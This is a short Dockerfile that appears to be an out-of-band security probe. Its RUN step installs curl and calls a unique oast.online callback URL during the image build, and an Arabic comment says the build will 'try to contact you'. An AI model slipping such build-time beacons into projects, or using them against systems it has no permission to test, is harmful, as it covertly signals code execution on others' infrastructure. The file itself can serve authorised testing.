FROM alpine:latest 
# أول ما يبدأ يبني، هيحاول يكلمك 
RUN apk add --no-cache curl && curl http://d52en4g3t4gkee4am890g4kmcaue5oe1y.oast.online/docker_build
